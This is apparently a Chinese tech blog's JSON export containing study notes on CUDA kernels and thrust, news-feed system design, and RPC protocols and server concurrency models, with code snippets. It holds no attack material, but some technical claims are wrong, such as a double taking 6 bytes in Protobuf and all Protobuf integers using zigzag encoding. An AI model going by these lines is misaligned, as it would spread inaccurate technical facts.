Func&gt;__global__ void parallel_for(int n, Func func) &#123; for (int i = blockDim.x * blockIdx.x + threadIdx.x; i &lt; n; i += blockDim.x * gridDim.x) &#123; func(i); &#125;&#125;struct MyFunctor &#123; __device__ void operator()(int i) const &#123; printf(\"number %d\\n\", i); &#125;&#125;;int main() &#123; int n = 65536; parallel_for&lt;&lt;&lt;32, 128&gt;&gt;&gt;(n, MyFunctor&#123;&#125;); checkCudaErrors(cudaDeviceSynchronize()); return 0;&#125; 注意： Func 不可以是 Func const &amp;，那样会变成一个指向 CPU 内存地址的指针，从而出错。所以 CPU 向 GPU 的传参必须按值传。 做参数的这个函数必须是一个有着成员函数 operator() 的类型，即 functor 类。而不能是独立的函数。 这个函数必须标记为 __device__，即 GPU 上的函数，否则会变成 CPU 上的函数。 functor 可以是 lambda 表达式。不过必须在 [] 后，() 前，插入 __device__ 修饰符。而且需要开启 --extended-lambda 编译选项。在 CMake 中表示为： 1target_compile_options(main PUBLIC $&lt;$&lt;COMPILE_LANGUAGE:CUDA&gt;:--extended-lambda&gt;) 这里使用了 CMake 的生成器表达式，限制 flag 只对 CUDA 源码生效。 捕获外部变量 将 GPU 上的内存地址浅拷贝到 lambda 中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;cstdio&gt;#include &lt;cuda_runtime.h&gt;#include \"helper_cuda.h\"#include &lt;vector&gt;template &lt;class T&gt;struct CudaAllocator &#123; using value_type = T; T *allocate(size_t size) &#123; T *ptr = nullptr; checkCudaErrors(cudaMallocManaged(&amp;ptr, size * sizeof(T))); return ptr; &#125; void deallocate(T *ptr, size_t size = 0) &#123; checkCudaErrors(cudaFree(ptr)); &#125; template &lt;class ...Args&gt; void construct(T *p, Args &amp;&amp;...args) &#123; if constexpr (!(sizeof...(Args) == 0 &amp;&amp; std::is_pod_v&lt;T&gt;)) ::new((void *)p) T(std::forward&lt;Args&gt;(args)...); &#125;&#125;;template &lt;class Func&gt;__global__ void parallel_for(int n, Func func) &#123; for (int i = blockDim.x * blockIdx.x + threadIdx.x; i &lt; n; i += blockDim.x * gridDim.x) &#123; func(i); &#125;&#125;int main() &#123; int n = 65536; std::vector&lt;int, CudaAllocator&lt;int&gt;&gt; arr(n); // 拷贝指针 int *arr_data = arr.data(); parallel_for&lt;&lt;&lt;32, 128&gt;&gt;&gt;(n, [=] __device__ (int i) &#123; arr_data[i] = i; &#125;); checkCudaErrors(cudaDeviceSynchronize()); for (int i = 0; i &lt; n; i++) &#123; printf(\"arr[%d] = %d\\n\", i, arr[i]); &#125; return 0;&#125; 不能 [=] 传arr，因为vector 默认深拷贝。或者 [&amp;] 传arr，因为arr是个CPU上的对象，不是GPU上实际内存地址的指针。 数学运算 使用C的函数计算，通过GPU进行加速。GPU 比 CPU 快了很多。另外GPU需要预热，若执行多次循环，速度会更快，相差100倍是没问题的。 注意计算 float 类型数值，使用对应 float 版本函数，sinf、cosf、rsqrtf等。 两个下划线的是 __sinf 是 GPU intrinstics，适合对精度要求不高，但有性能要求的图形学任务。 编译选项 --ftz=true 会把极小数(denormal)退化为0。 --prec-div=false 降低除法的精度换取速度。 --prec-sqrt=false 降低开方的精度换取速度。 --fmad 因为非常重要，所以默认就是开启的，会自动把 a * b + c 优化成乘加(FMA)指令。 若开启了 --use_fast_math 选项，那么所有对 sinf 的调用都会自动被替换成 __sinf。同时自动开启上述所有优化。 CUDA thrust 库 thrust 相当于设计给 GPU 的STL。包括上述中，GPU上的vector也不用手动实现，直接使用 thrust 就可以。 thrust::universal_vector 会在统一内存上分配，因此不论 GPU 还是 CPU 都可以直接访问到。 thrust::device_vector 则是在 GPU 上分配内存，thrust::host_vector 在 CPU 上分配内存。 可以通过 = 运算符在 thrust::device_vector 和 thrust::host_vector 之间拷贝数据，他会自动帮你调用 cudaMemcpy。 板块共享内存 GPU 是由多个流式多处理器（SM）组成的。每个 SM 可以处理一个或多个板块。 SM 又由多个流式单处理器（SP）组成。每个 SP 可以处理一个或多个线程。 每个 SM 都有自己的一块共享内存（shared memory），他的性质类似于 CPU 中的缓存——和主存相比很小，但是很快，用于缓冲临时数据。 在 CUDA 的语法中，共享内存可以通过定义一个修饰了 __shared__ 的变量来创建。 1__shared__ int local_sum[1024]; 内存延迟 SM 执行一个板块中的线程时，并不是全部同时执行的。而是一会儿执行这个线程，一会儿执行那个线程。某个线程有可能因为在等待内存数据的抵达，这时大可以切换到另一个线程继续执行计算任务。 内存延迟是阻碍 CPU 性能提升的一大瓶颈。 CPU 解决方案是超线程技术，一个物理核提供两个逻辑核，当一个逻辑核陷入内存等待时切换到另一个逻辑核上执行，避免空转。 GPU 的解决方法就是单个 SM 执行很多个线程，然后在遇到内存等待时，就自动切换到另一个线程。__syncthreads() 会强制同步当前板块内的所有线程。 线程组分歧（warp divergence） GPU 线程组（warp）中 32 个线程实际是绑在一起执行的，就像 CPU 的 SIMD 那样。因此如果出现分支（if）语句时，如果 32 个 cond 中有的为真有的为假，则会导致两个分支都被执行！ 建议 GPU 上的 if 尽可能 32 个线程都处于同一个分支，要么全部真要么全部假，否则实际消耗了两倍时间！ 寄存器打翻（register spill） 板块中线程数量过多带来的问题。 GPU 线程的寄存器，实际上也是一块比较小而块的内存，称之为寄存器仓库（register file）。板块内的所有的线程共用一个寄存器仓库。 当板块中的线程数量（blockDim）过多时，就会导致每个线程能够分配到的寄存器数量急剧缩小。而如果你的程序恰好用到了非常多的寄存器，那就没办法全部装在高效的寄存器仓库里，而是要把一部分“打翻”到一级缓存中，这时对这些寄存器读写的速度就和一级缓存一样，相对而言低效了。若一级缓存还装不下，那会打翻到所有 SM 共用的二级缓存。 延迟隐藏（latency hiding）失效 板块中的线程数量过少带来的问题。 当线程组陷入内存等待时，可以切换到另一个线程，继续计算，这样一个 warp 的内存延迟就被另一个 warp 的计算延迟给隐藏起来了。因此，如果线程数量太少的话，就无法通过在多个 warp 之间调度来隐藏内存等待的延迟，从而低效。 最好让板块中的线程数量（blockDim）为32的整数倍，否则假如是 33 个线程的话，那还是需要启动两个 warp，其中第二个 warp 只有一个线程是有效的，非常浪费。 对于使用寄存器较少、访存为主的核函数（例如矢量加法），使用大 blockDim 为宜。反之（例如光线追踪）使用小 blockDim，但也不宜太小。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"CUDA","slug":"Notes/CUDA","permalink":"https://racleray.github.io/categories/Notes/CUDA/"}],"tags":[{"name":"CUDA","slug":"CUDA","permalink":"https://racleray.github.io/tags/CUDA/"}],"author":"HeRui"},{"title":"系统设计笔记","slug":"系统设计笔记","date":"2023-07-13T11:19:37.000Z","updated":"2024-01-09T10:21:47.068Z","comments":true,"path":"posts/598ff250.html","link":"","permalink":"https://racleray.github.io/posts/598ff250.html","excerpt":"系统设计分析","text":"与面向对象 面向对象：具体细化的设计 系统设计：高屋建瓴，系统架构 示例：设计 twitter 系统 首先，先交流，比如用户规模、硬件条件等。 可行性 work solution special case analysis tradeoff knowledge base 4S分析 Scenario, Service, Storage, Scale Scenario 场景 说人话：需要设计哪些功能，设计得多牛 Ask / Features / QPS / DAU / Interfaces Service 服务 说人话：将大系统拆分为小服务 Split / Application / Module Storage 存储 说人话：数据如何存储与访问 Schema / Data / SQL / NoSQL / File System Scale 升级 说人话：解决缺陷，处理可能遇到的问题 Sharding / Optimize / Special Case Work solution . NOT perfect solution. Scenario 需要什么功能；多大的访问量（Daily active users, Monthly active users ...） 第一步 enumerate，罗列功能： Register / Login User Profile Display / Edit Upload Image / Video * Search * Post / Share a tweet Timeline / News Feed Follow / Unfollow a user 第二步 sort，选出核心功能： Post a Tweet Timeline News Feed Follow / Unfollow a user Register / Login 第三步 analysis &amp; predict: 并发用户 concurrent user: 日活跃 = 每个用户平均请求次数 / 一天多少秒 峰值 Peak = average concurrent user * 3 对于快速增长的产品：MAX peak in 3 months = peak users * 2 读频率 read qps 写频率 write qps QPS QPS = 100 用你的笔记本做 Web 服务器就好了 QPS = 1k 用一台好点的 Web 服务器就差不多了，需要考虑 Single Point Failure QPS = 1m 需要建设一个1000台 Web 服务器的集群 ，需要考虑如何 Maintainance（某一台挂了怎么办 QPS 和 Web Server (服务器) / Database (数据库) 之间的关系 一台 Web Server 约承受量是 1k 的 QPS （考虑到逻辑处理时间以及数据库查询的瓶颈） 一台 SQL Database 约承受量是 1k 的 QPS（如果 JOIN 和 INDEX query比较多的话，这个值会更小） 一台 NoSQL Database (Cassandra) 约承受量是 10k 的 QPS 一台 NoSQL Database (Memcached) 约承受量是 1M 的 QPS Service 服务 差分系统： replay 重放需求。比如，User Service, Tweet Service, Media Service, Friendship Service 针对需求，添加服务 归并相同服务 merge 归并需求 Storage 存储 数据库系统：对文件系统的一层包装，提供更丰富、功能更强大的接口 关系型数据库：用户信息 非关系型数据库：推文、社交图谱 文件系统 图片、视频 缓存 不支持数据持久化 nonpersistent 效率高，内存级访问速度 第一步 select：选择合适的存储结构 第二步 schema：细化数据表结构 程序 = 算法 + 数据结构 系统 = 服务 + 数据存储 设计 schema： News Feed 如何存储 登录之后看到的信息流。每个人看到的内容时不同的。 Pull Model 主动拉取 算法：将每个好友的前100条信息，合并出100条news feed。 Merge K Sorted Arrays. 复杂度：N个关注对象，N次DB Reads 时间 + 归并时间。Post a tweet 是一次 DB Write 的时间。 缺陷： N次 DB Reads非常慢 Push Model 算法： 每个用户一个 List 存储个人的 News Feed 信息 好友发出 tweet ，同步到每个用户的 List 中 （即 fanout 过程） 用户查询时，只需要从List中读取100条最新的信息 复杂度： 查询，执行一次 DB read post，N个粉丝，执行N次DB write。可异步执行。 新建 News Feed Table 可设计如下 建立索引：对于很大的 table，可建立 复合索引，先按x排序，x相同的再按照y排序，查询可以更高效。 比较 Social App的模型 Facebook – Pull Instagram – Push + Pull Twitter -- Pull 朋友圈 -- Push 为了更好的 ranking，一般使用 Pull 模型。 Scale 扩展 优化系统 第一步 optimize：设计缺陷；功能设计；特殊情况 第二步 maintenance: 鲁棒性；扩展性 Pull 缺陷 DB reads 前加入 cache cache 每个用户的 timeline：trade off，cache多少 cache 每个用户的 news feed：没有 cache 时，读取，归并，然后取100；有cache时，归并N个用户在某个时间戳之后的 tweets Quest: 对比 MySQL 与 Memcahed QPS Push 缺陷 消耗更多的 Disk 空间，BUT disk is cheap. （Pull 取数据存在 内存 中） Inactive Users：粉丝排序，比如按登录时间顺序排序，先fanout活跃用户 异步的一种潜在缺陷：Unfollow 之后，刷新 timeline 存在延迟 结合 在现有模型的基础上，做最小的改，比如用更多的机器进行 Push 的fanout 对长期的增长进行估计，评估是否值得转换模型 结合方案： 普通用户：Push 明星用户：不进行 Push 当用户需要的时候，从明星用户的timeline里取，并合并到 news feed 中 出现问题：如何定义 明星用户？当明星用户突然变成普通用户从 Pull 模型转换为 Push 模式，如何保证前明星用户的信息推送到粉丝 news feed 中？ 是不是明星不能在线动态计算，要离线计算 为 User 增加一个 is_superstar 的属性 一个用户被标记为 superstar 之后，就不能再被取消标记 选择 tradeoff 什么时候用 Push ？ 资源少 少写代码 实时性要求不高 用户发帖少 双向好友关系，没有明星问题（朋友圈） 什么时候用 Pull ? 资源充足 实时性要求高 用户发帖很多 单向好友关系，有明星问题 其他通用问题 数据库服务器挂了怎么办？ 用户逐渐增加怎么办？ 服务器顶不住压力 数据库顶不住压力 系统设计总结 No more no less Work solution first Analysis is important than solution 拓展问题：Normalize VS Denormalize 扩展问题：惊群现象 Thundering Herd 通常会使用缓存来作为数据库的“挡箭牌” ，优化一些经常读取的数据的访问速度。 在高并发情况下，如果一条非常热的数据，因为 “缓存过期” 或者 “被淘汰算法淘汰”， 缓存之后，会导致短时间内（&lt;1s）, 大量的数据请求会出现 “缓存穿透”（Cache Miss），因为数据从 DB 到 Cache 需要时间，从而这些请求都会去访问数据库，导致数据库处理不过来而崩溃，从而影响 到其他数据的访问而导致整个网站崩溃。 解决办法及参考资料 Memcache Lease Get - 《Scaling Memcache at Facebook》http://bit.ly/1jDzKZK Facebook 如何解决惊群效应的：https://bit.ly/1Q3t3P7 Redis 防雪崩架构设计 https://bit.ly/2KFneb 消息队列 先进先出的任务队列 做任务的worker进程共享一个列表 worker从任务列表中获取任务，做完之后反馈给队列服务器 队列服务器是做异步任务必须要有的组成部分 常用：RabbitMQ、ZeroMQ、Redis、Kafka 其他问题 news feed 如何实现 分页 pagination？ twitter pull 用 cache 来存 timeline 时，如何保存实时性问题？","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"System Design","slug":"Notes/System-Design","permalink":"https://racleray.github.io/categories/Notes/System-Design/"}],"tags":[{"name":"System Design","slug":"System-Design","permalink":"https://racleray.github.io/tags/System-Design/"}],"author":"HeRui"},{"title":"RPC笔记","slug":"RPC笔记","date":"2023-07-09T13:33:13.000Z","updated":"2024-01-09T10:21:27.146Z","comments":true,"path":"posts/4ac86dd1.html","link":"","permalink":"https://racleray.github.io/posts/4ac86dd1.html","excerpt":"RPC技术学习笔记","text":"问题场景 一个完整的大型服务会被打散成很多很多独立的小服务，每个小服务会由独立的进程去管理来对外提供服务，也就是 微服务 。用户请求的分发和处理，子服务子系统间结果的通信，向用户返回结果，都是RPC应对的场景。 简介 RPC (Remote Procedure Call)即远程过程调用，是分布式系统常见的一种通信方法。当两个物理分离的子系统需要建立逻辑上的关联时，RPC 是通信的技术手段之一。除 RPC 之外，常见的多系统数据交互方案还有分布式==消息队列==、==HTTP 请求调用==、==数据库==和==分布式缓存==等。 RPC 和 HTTP 调用是没有经过中间件的，它们是端到端系统的直接数据交互。HTTP 调用其实也可以看成是一种特殊的 RPC。知名应用有 Nginx/Redis/MySQL/Dubbo/Hadoop/Spark/Tensorflow 等产品。 Nginx 与 RPC Ngnix 可以为后端分布式服务提供负载均衡的功能，它可以将后端多个服务地址聚合为单个地址来对外提供服务。 Nginx 和后端服务之间的交互在本质上也可以理解为 RPC 数据交互。除了HTTP，Nginx 和后端服务之间还可以走其它的协议，比如 uwsgi 协议、fastcgi 协议等，这两个协议都是采用了比 HTTP 协议更加节省流量的二进制协议。 uWSGI 是著名的 Python 容器，使用它可以启动 uwsgi 协议的服务器对外提供服务。 Hadoop 与 RPC 大数据需要通信的量比业务系统更加庞大，所以在数据通信优化上做的更深。 Hadoop 文件系统 hdfs，一般包括一个 NameNode 和多个 DataNode，NameNode 和 DataNode 之间就是通过一种称为 Hadoop RPC 的二进制协议进行通讯。 TensorFlow 与 RPC 当多个分布式节点需要集群计算时，就必须引入 RPC 技术进行通讯。Tensorflow Cluster 的 RPC 通讯框架使用了 Google 内部自研的 gRPC 框架。 基于Socket的RPC和基于HTTP的RPC 基于Socket的RPC性能可以达到基于HTTP的RPC的 4 到 10 倍。 HTTP VS RPC HTTP 调用其实也是一种特殊的 RPC。 HTTP1.0 协议时，HTTP 调用还只能是短链接调用，一个请求来回之后连接就会关闭。HTTP1.1 引入了 KeepAlive 特性可以保持 HTTP 连接长时间不断开，以便在同一个连接之上进行多次连续的请求，进一步拉近了 HTTP 和 RPC 之间的距离。 HTTP2.0 之后，Google 开源了一个建立在 HTTP2.0 协议之上的通信框架直接取名为 gRPC，也就是 Google RPC。 HTTP API虽然效率不高，但是通用，没有太多沟通的学习成本。 RPC 更加高效，经过对应的设计，进行高效率的交流，要比通用的 HTTP 协议来交流更加节省资源。比如 开源 RPC 协议中 Protobuf 和 Thrift 就是方言中的两种。 运行在同一个操作系统实的两个进程通信时，还有共享内存、信号量、文件系统、内核消息队列、管道等，本质上都是通过操作系统内核机制来进行数据和消息的交互。但在现代企业服务中，这种单机应用已经非常少见了。 开源资源与资料 Remote procedure call - Wikipedia gRPC - Wikipedia Home · hprose/hprose Wiki (github.com) Home · baidu/sofa-pbrpc Wiki (github.com) buttonrpc RPC交互过程 消息协议设计 首先，需要区分每个独立的消息数据，考虑消息数据如何组织表示，如何设计消息数据的格式。 边界 RPC 需要在一条 TCP 链接上进行多次消息传递。网络协议传输过程中，可能存在拆包、粘包问题。需要设计边界区分方法。 比如，使用特殊符号分割不同消息（\\r\\n）（常用于文本格式消息），或者直接在消息中附加消息数据长度信息（常用于二进制消息）。 结构 显示结构 json 是一种显式结构的消息协议。可读性好，但是冗余信息多。 其中标准格式使用很多标记符号 \"、:、{} 等。连续的多条 json 消息即使结构完全一样，仅仅只是 value 的值不一样，也需要发送同样的 key 字符串信息。 一种优化方法：RPC建立连接时，就确定消息的结构，之后只需要根据结构发送 value 值，自动和 key 相对应。比如，Hadoop的 avro 协议。 隐式结构 结构信息由代码来约定的消息协议。在 RPC 交互的消息数据中只是二进制数据，由代码来确定相应位置的二进制是属于哪个字段。 隐式消息的优点就在于节省传输流量，不需要传输结构信息。 压缩 对消息进行压缩处理，可以减轻网络带宽压力，但也会加重 CPU 的负担。 比如 Google 的 snappy 算法，运行性能非常好，压缩比例接近最优。阿里的 SOFA RPC 就使用了 snappy 作为协议层压缩算法。 压缩相关优化 使用变长 varint 表示整数，最高bit位不再表示符号，而是下一个byte是否和当前byte是同一个int的一部分。 对负数，使用zigzag编码，就是将 0 映射到 0，-1 映射到 1，1 映射到 2，-2 映射到 3... 将负数编码成正奇数，正数编码成偶数。解码的时候遇到偶数直接除 2 就是原值，遇到奇数就加 1 除 2 再取负就是原值。 协议例子 Redis 文本协议 Redis 设计了一套专用的文本通讯协议 RESP。Redis设计者认为数据库系统的瓶颈一般不在于网络流量，而是数据库自身内部逻辑处理上。所以使用浪费流量的文本协议，依然可以取得极高的访问性能。 Redis 将所有数据都放在内存，用一个单线程对外提供服务，单个节点跑满一个 CPU 核心时可以达到了 10w/s 的 QPS。 RESP(Redis Serialization Protocol) 协议设计为： 单行字符串 以 + 符号开头； 多行字符串 以 $ 符号开头，后跟字符串长度； 整数值 以 : 符号开头，后跟整数的字符串形式； 错误消息 以 - 符号开头； 数组 以 * 号开头，后跟数组的长度； 单元结束时统一加上回车换行符号\\r\\n。 另外，NULL 表示为 $-1，空串 表示为 $0，两个\\r\\n 之间隔的是空串。 示例 客户端向服务器发送 set 指令set author codehole： 1*3\\r\\n$3\\r\\nset\\r\\n$6\\r\\nauthor\\r\\n$8\\r\\ncodehole\\r\\n 服务器向客户端回复的响应要支持多种数据结构。比如 OK 响应： 1+OK 错误响应： 1-ERR ... 整数响应： 1:1 数组响应，这里将hash表的key和value作为数组传递： 1*6\\r\\n$4\\r\\nname\\r\\n$6\\r\\nxxx\\r\\n$3\\r\\nage\\r\\n$2\\r\\n30\\r\\n Redis协议的缺陷 首先，RPC 是建立在 TCP 协议基础上进行消息传递，而 TCP 连接并不总是稳定的。如果因为某些原因断开连接，客户端需要判断服务器是否已经处理了消息还是根本就没收到，没收到的话就需要重新发送请求。如果服务器已经在处理请求了，再重发就会重复执行请求，造成无效的服务器负载。 一种方法，是给每个请求一个全局唯一ID，服务器负责在处理请求时，将ID和处理结果缓存。如果收到重复请求，就直接返回缓存结果。 Redis并没有采用以上方法。Redis的方法显得随意。 Redis只是提供retry_on_timeout选项来让用户自己决定要不要在TimeoutError时进行重试，而不管是否出现重复请求。 稍微分析redis给出的两种错误，就会发现redis在处理逻辑上缺陷。 对于ConnectionError，指在建立连接时就出了错，直接进行重新请求。 对于TimeoutError，分为读超时，写超时。 写超时 写超时是指内核为当前套接字开辟的写缓存空间已经满了，三种情况导致client缓冲区装满： client写方的消息因为网络原因迟迟达到不了读方。无法确定是否server在未来会收到，不可随意重试； server老是不读消息，所以没有及时给 client 发送 ack。无法确定是否server在未来会处理，不可随意重试； client因为网络原因没有收到 ack。由于server已经处理了请求，再重发请求会重复处理请求。且可能再次出现ack包丢失。 读超时 读超时是指发送完请求，recv迟迟收不到响应，或者只收到部分响应消息。redis并没有进行处理请求是否送达的逻辑。所以不能确定是否有必要重试。 Protobuf 二进制协议 Protobuf 提供了一种描述通讯协议的接口描述语言 IDL，通过编写接口协议，Protobuf 可以自动生成多种语言的 RPC 通讯代码。 Protobuf 消息被转化为二进制的 key - value 。key 由两部分组成，tag（默认4bits）其值对应 .proto 代码中 message 消息体中字段编号；type（3bits）其值对应8种参数类型。当 message 消息体中字段数超过 16，varint编码也可以处理，只需增加一个byte。 1| 1 | tag(7 high bits) | 0 | tag(4 low bits) | type(3 bits) | 最高位的 0 和 1 ，标志着下一个byte是否和当前byte共同表示一个值。 type 数值 Protobuf 的整数数值使用 zigzag 编码。浮点数 float 和 double，分别使用 4 个字节和 6 个字节序列化，没有特殊处理。 zigzag：对负数，使用zigzag编码，就是将 0 映射到 0，-1 映射到 1，1 映射到 2，-2 映射到 3... 将负数编码成正奇数，正数编码成偶数。解码的时候遇到偶数直接除 2 就是原值，遇到奇数就加 1 除 2 再取负就是原值。 字符串 字符串值使用长度前缀编码 (length-delimited) 。第一个字节是字符串的长度（varint），后面相应长度的字节串就是字符串的内容。 可选选项（optional） 二进制流里面可没有使用任何标志为来表示字段是否可选，只是在运行时做了检查。3.0之前，设置 required 选项可以强制检查是否填写某字段，并抛出异常。但3.0之后，所有类型都变成了 optional，移除了 required。 列表（repeated） 在消息体中，重复当前 key，得到不同 value 的列表。 示例 定义 proto 文件 12345678syntax &#x3D; &quot;proto2&quot;;package ppack;message Person &#123; required string user_name &#x3D; 1; &#x2F;&#x2F; 必须字段 optional int64 id_number &#x3D; 2; &#x2F;&#x2F; 可选字段 repeated string interests &#x3D; 3; &#x2F;&#x2F; 列表类型&#125; protoc 编译之后，在cpp中使用： 12345678#include \"ppack.pb.h\"... ppack::Person pp; pp.set_user_name = \"allen\"; pp.set_id_number = 1337; pp.set_interests(0, \"daydreaming\"); pp.set_interests(1, \"hacking\");... 其二进制表示如下图： Protobuf传递消息，还需要通过消息头的Length字段确定消息边界，同时传递消息解析需要的 message 消息类型定义。完整消息体如下图： RPC 客户端 实现 RPC 客户端核心难点在于客户端往往并不是单线程的，我们需要考虑多线程下如何流畅使用客户端而不出现并发问题。 客户端和数据库之间会维护一个连接池，并严格控制有效连接的数量。 锁 每个线程都会访问线程池对象，使用锁来控制数据结构的安全。 考虑到连接都是用来进行相对缓慢的 IO 操作，锁的耗时相比 IO 操作耗时可以忽略不计。所以，在性能许可的前提下，可以为了代码的简洁性，设计粗粒度的锁。 惰性连接 如果一个系统非常闲置，而提前开辟了太多的连接池那是对资源的浪费。使用惰性连接，在需要的时候才会去向数据库申请新的连接。 惰性连接的问题，也是冷启动常见的问题： 如果数据库连接参数不正确，需要在收到用户的请求进行显示的数据访问时才能发现。 服务器需要热身，早来的请求需要额外付出一次建立连接的代价。 连接健康检查 连接池中管理的连接可能会因为网络原因而损坏断连。连接池需要保持内部管理的连接是可用的。常见检查时机是： 线程从连接池中申请连接，在返回连接之前进行检查； 线程将连接归还给连接池时，对连接进行检查； 线程池定时对连接进行检查。 常见检查方法： ping 心跳检查 处理问题连接： 抛弃连接，连接池的连接数量减一，必要时，重新申请一个连接； 重连当前连接。 心跳检测 当客户端长期空闲时，服务器往往会自动关闭连接已减轻资源消耗。 当客户端再次请求时，就会遇到连接已断开的错误。为了避免这种错误，一般有两种方法： 遇到连接错误时进行重连重试； 通过心跳方式告知服务器不要关闭连接，每间隔一定时间发送心跳检测包，并确认服务端响应。 处理超时 当连接池内连接不够用，造成线程等待空闲连接，产生超时。处理方法一般有三种： 永不超时，等不到就接着等，不是一种好的选择。 设定超时时限，超时后，就向外部跑出超时异常，中断业务逻辑。 申请一个新的连接给调用方。归还连接的时候，若连接池不满就纳入连接池，若连接池满了，就直接销毁。 性能监控 对客户端连接池进行执行时间等信息监控，并提供监听接口，方便输出监控统计信息。 连接多路复用 (multiplexing) 传统的 RPC 客户端，同一个连接上连续的两个请求必须按先后顺序排队获取结果。多路复用的 RPC客户端，同一个链接上可以同时进行多个请求，并且可以乱序执行。 HTTP2.0 就具备了多路复用的连接， gRPC 正是基于 HTTP2.0 的多路复用的连接封装的一款高性能 RPC 框架。 多路复用的连接往往都是线程安全的，它支持多个线程同时写入请求而不会出现并发问题。但是其实现难度和工作量都比较大。 单向请求 有些不是特别重要的请求可以不需要服务器进行响应，客户端在发送完请求之后也不需要等待结果直接返回，这就是 oneway 单向请求，比如日志信息。 Redis-py 12345678910111213141516171819def get_connection(self, command_name, *keys, **options): \"Get a connection from the pool\" self._checkpid() try: connection = self._available_connections.pop() except IndexError: connection = self.make_connection() self._in_use_connections.add(connection) return connection...def release(self, connection): \"Releases the connection back to the pool\" self._checkpid() if connection.pid != self.pid: return self._in_use_connections.remove(connection) self._available_connections.append(connection) RPC服务端 主线沿着：单线程同步 -- 多线程同步 -- 多进程同步 -- Preforking同步 -- 单进程异步 -- PreForking异步，进行逐步分析。 单线程同步模型 单线程同步模型的服务器，每次只能处理一个客户端连接，其它连接必须等到前面的连接关闭了才能得到服务器的处理。 多线程同步模型 服务器可以并行处理多个客户端，每一个新连接开启一个新的线程单独进行处理。每个线程都是同步读写（会等待IO阻塞）客户端连接。 多进程同步模型 Python 的 GIL 致使单个进程只能占满一个 CPU 核心，多线程并不能充分利用多核的优势。所以多数 Python 服务器推荐使用多进程模型。 本质就是使用单独进程处理每个新连接。 12345678910111213# 处理新链接while True: conn, addr = sock.accept() pid = os.fork() # 好戏在这里，创建子进程处理新连接 if pid &lt; 0: # fork error return if pid &gt; 0: # parent process conn.close() # 关闭父进程的连接文件描述符，子进程会处理 continue if pid == 0: sock.close() # 套接字引用计数减一，子进程创建导致计数加一 handle_conn(conn, addr, handlers) # 只使用连接文件描述符 break # 处理完后一定要退出循环，不然子进程会继续 accept 连接 Preforking同步模型 进程要比线程更加吃资源，当连接增加，进程数量增加，操作系统的调度压力也就会增大。 采用 PreForking 模型可以对子进程的数量进行了限制。 PreForking 是通过预先产生多个子进程，当一个连接到来时，每个子进程都有机会拿到这个连接，但是最终只会有一个进程能 accept 。 Prefork 之后，父进程创建的服务套接字引用，每个子进程也会继承一份，它们共同指向了操作系统内核的套接字对象，共享了同一份连接监听队列。 子进程和父进程一样都可以对服务套接字进行 accept 调用，从共享的监听队列中摘取一个新连接进行处理。 子进程拿到连接后，该进程内部可以继续使用单线程或者多线程同步的形式对连接进行处理。 123456789101112131415161718def prefork(n): for i in range(n): pid = os.fork() if pid &lt; 0: # fork error return if pid &gt; 0: # parent process continue if pid == 0: break # child process...# 建立socket...# preforkprefork(10)# 进行单线程或者多线程同步处理逻辑... 单进程异步模型 非阻塞IO 操作系统提供的文件读写操作默认都是同步的，它必须等到数据就绪后才能返回，如果数据没有就绪，它就会阻塞当前的线程。 非阻塞选项意味着，内核套接字的 ReadBuffer 有多少字节，read 操作就返回多少字节；内核套接字的 WriteBuffer 有多少剩余字节空间，write 操作就写多少字节。然后线程可以继续干别的事，稍后再继续进行读写。 事件轮询 select、 poll、epoll 等系统调用API，可以监听查询相关套接字是否有相应的读写事件。而不用轮询每一个套接字文件描述符，反复read和write来检查是否有数据。 事件驱动的方式，比轮询更高效。没有事件时， API 会阻塞，服务器进程无事可做，不需要一直轮询。 读写缓冲区 读 非阻塞 IO 要求用户程序为每个套接字维持一个 ReadBuffer，它和操作系统内核区的 ReadBuffer 不是同一个东西。用户态的 ReadBuffer 是由用户代码来进行控制。 因为读是非阻塞的。当我们想要读取 100 个字节时，我们可能经历了多次 read 调用，第一次读了 10 个字节，第二次 30 个字节，然后又读了 80 个字节。凑够了 100 个字节时，可以解码出一个完整的请求，剩余的 20 个字节又是后面请求消息的一部分。这就是所谓的半包问题。 用户态的 ReadBuffer 就是来保存半包消息的，直到可以解码出一个完整的消息内容。 写 非阻塞写，意味着当我们想要写 100 个字节时，我们可能经历了多次 write 调用，第一次 write 了 10 个字节，第二次 write 了 30 个字节，最后才把剩余的 60 个字节写出去了。 用户态WriteBuffer就是保存第一没写完的90字节、第二次没写完的60字节的，让下一次 write 可以继续写完剩余的部分。 PreForking异步 将 PreForking 机制和事件轮询异步读写结合起来，可以进一步提升系统高并发的能力。 开源框架 Tornado 和开源代理服务器 Nginx 正是采用了多进程 PreForking 异步模型。 Nginx 并发模型 Nginx 的并发模型是一个多进程并发模型，它的 Master 进程在绑定监听地址端口后 fork 出了多个 Slave 进程共同竞争处理这个服务端套接字接收到的很多客户端连接。 Slave 进程会共享同一个处于操作系统内核态的套接字队列。 这是一个生产者消费者模型，生产者是操作系统的网络模块，消费者是多个 Slave 进程，队列中的对象是与客户端连接的套接字。 这种模型在负载均衡上有一个缺点，那就是套接字分配不均匀，「闲者愈闲，忙者愈忙」的状态。 因为当多个进程竞争同一个套接字队列时，操作系统采用了 LIFO 的策略，最后一个来 accept 的进程最优先拿到套接字。越是繁忙的进程越是有更多的机会调用 accept，它能拿到的套接字也就越多。 Node Cluster 并发模型 Node Cluster 为了解决负载均衡问题，规定负责 accept 套接字的只能是 Master 进程，Slave 进程只负责处理客户端套接字请求。父进程就可以将 accept 到的客户端套接字轮流传递给多个 Slave 进程，负载均衡的目标就可以顺利实现了。 使用本地套接字进行进程间通信，将 Master 中完成 accept 的套接字发送到 Slave 子进程中。这里的传递描述符，本质上不是传递，而是复制。子进程收到的描述符和父进程的描述符也不是同一个值。但是父子进程的描述符都会指向同一个内核套接字对象。 本地套接字分为两种，有名套接字和无名套接字。有名套接字会在文件系统指定一个路径名，进程之间都可以通过这个路径来访问本地套接字。无名套接字一般用于父子进程之间，父进程中创建本地套接字，子进程中持有这个套接字的引用。 12345678910111213141516171819202122232425262728293031323334353637383940414243def prefork(serv_sock, n): pws = [] for i in range(n): pr, pw = socket.socketpair() # 父子进程通信套接字 pid = os.fork() if pid &lt; 0: # fork error return pws if pid &gt; 0: pr.close() # 父进程不用读 pws.append(pw) continue if pid == 0: serv_sock.close() # 关闭引用 pw.close() # 子进程不用写 return pr return pws# 建立socket，监听某端口...pws_or_pr = prefork(serv_sock, 10)# 父进程if 